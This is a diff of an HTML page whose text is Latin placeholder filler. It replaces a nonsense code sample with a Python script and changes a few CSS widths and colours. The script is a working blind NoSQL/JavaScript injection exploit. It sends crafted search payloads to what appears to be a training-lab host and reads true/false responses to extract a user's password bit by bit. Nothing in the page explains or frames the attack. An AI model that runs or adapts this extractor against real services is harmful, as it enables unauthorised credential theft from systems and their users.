@@ -35,10 +35,42 @@ vocavit spes videtur!</p>
 <p>Relevat in latuit et cum lenita, acrior frangitur erat <strong>amorem</strong>, si origine
 mihi mirata tumefecit genuumque est, mea! In mugire tumulos comes: ut summo
 nescio unius, data.</p>
-<pre class="language-bash"><code class="language-bash"><span class="token function">bash</span> <span class="token operator">=</span> rootkitRiscDrag * sram_address_metal<span class="token punctuation">;</span>
-controlTraceroute.interfaceQuadFlops<span class="token punctuation">(</span><span class="token number">87693</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-var portSimplex <span class="token operator">=</span> multiplatform<span class="token punctuation">;</span>
-malwareIspSystem <span class="token operator">=</span> <span class="token number">2</span> + <span class="token number">3</span> + <span class="token number">77</span> / pdfDvSip.applet.broadband<span class="token punctuation">(</span>recursive.balance<span class="token punctuation">(</span>address_cyberbullying_pdf, system_switch<span class="token punctuation">))</span><span class="token punctuation">;</span></code></pre>
+<pre class="language-python"><code class="language-python"><span class="token keyword">import</span> requests
+<span class="token keyword">import</span> urllib
+
+TARGET <span class="token operator">=</span> <span class="token string">"http://ptl-f5bbf73b-b9a37d50.libcurl.so/?search="</span>
+PROXIES <span class="token operator">=</span> <span class="token punctuation">{</span>
+    <span class="token string">"http"</span><span class="token punctuation">:</span><span class="token string">"http://localhost:8080"</span><span class="token punctuation">,</span>
+    <span class="token string">"https"</span><span class="token punctuation">:</span><span class="token string">"http://localhost:8080"</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">def</span> <span class="token function">oracle</span><span class="token punctuation">(</span>condition<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"admin'%20%26%26%20</span><span class="token interpolation"><span class="token punctuation">{</span>urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>condition<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">%20%00"</span></span>
+    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>TARGET<span class="token operator">+</span>payload<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> proxies<span class="token operator">=</span>PROXIES<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">b"?search=admin"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token boolean">True</span>
+    <span class="token keyword">return</span> <span class="token boolean">False</span>
+
+<span class="token keyword">def</span> <span class="token function">exfiltrateString</span><span class="token punctuation">(</span>field<span class="token punctuation">,</span> length<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    binary <span class="token operator">=</span> <span class="token string">""</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> i <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span> binary <span class="token operator">=</span> binary <span class="token operator">+</span> <span class="token string">" "</span>
+        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">if</span> oracle<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"('0'.repeat(Math.max(0,8-this.</span><span class="token interpolation"><span class="token punctuation">{</span>field<span class="token punctuation">}</span></span><span class="token string">.charCodeAt(</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token punctuation">}</span></span><span class="token string">).toString(2).length))+this.password.charCodeAt(</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token punctuation">}</span></span><span class="token string">).toString(2))[</span><span class="token interpolation"><span class="token punctuation">{</span>j<span class="token punctuation">}</span></span><span class="token string">]==1"</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+                binary <span class="token operator">=</span> binary <span class="token operator">+</span> <span class="token string">"1"</span>
+            <span class="token keyword">else</span><span class="token punctuation">:</span>
+                binary <span class="token operator">=</span> binary <span class="token operator">+</span> <span class="token string">"0"</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>binary<span class="token punctuation">)</span>
+
+
+<span class="token keyword">assert</span> oracle<span class="token punctuation">(</span><span class="token string">"1===1"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token boolean">True</span>
+<span class="token keyword">assert</span> oracle<span class="token punctuation">(</span><span class="token string">"1===0"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token boolean">False</span>
+
+
+<span class="token comment"># XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX</span>
+<span class="token comment"># '0'.repeat(Math.max(0,8-this.password.charCodeAt(11).toString(2).length)) this.password.charCodeAt(11).toString(2)[1]==1</span>
+
+exfiltrateString<span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">)</span></code></pre>
 <p>Certe probavit quam non praeside, sibi quoque Amathunta proxima. Ope <a href="http://vulgaruntamplexas.io/">causa
 accepere</a> macies ortygiam mutata suus tuorum
 ignes, mollis <strong>timuitque sortitus init</strong>. Quae <a href="http://achille-ut.com/nil.html">nescisse
@@ -97,7 +129,7 @@ moenia</a>.</p>
 		.content-container {
 			background-color: #1D2021;
 			box-sizing: content-box;
-			width: 80%;
+			width: 100%;
 			display: flex;
 			flex-direction: column;
 			justify-content: left;
@@ -106,12 +138,12 @@ moenia</a>.</p>
 			margin-top: 10vh;
 			margin-bottom: 10vh;
 			border: 1px solid #B8BB26;
-			min-width: 80vh;
-			max-width: 90vh;
+			min-width: 90vh;
+			max-width: 100vh;
 		}
 
 		.text-container {
-			color: #B8BB26;
+			color: #D3C4A1;
 			padding: 1vw;
 			font-size: calc(0.7vw + 0.7vh);
 		}
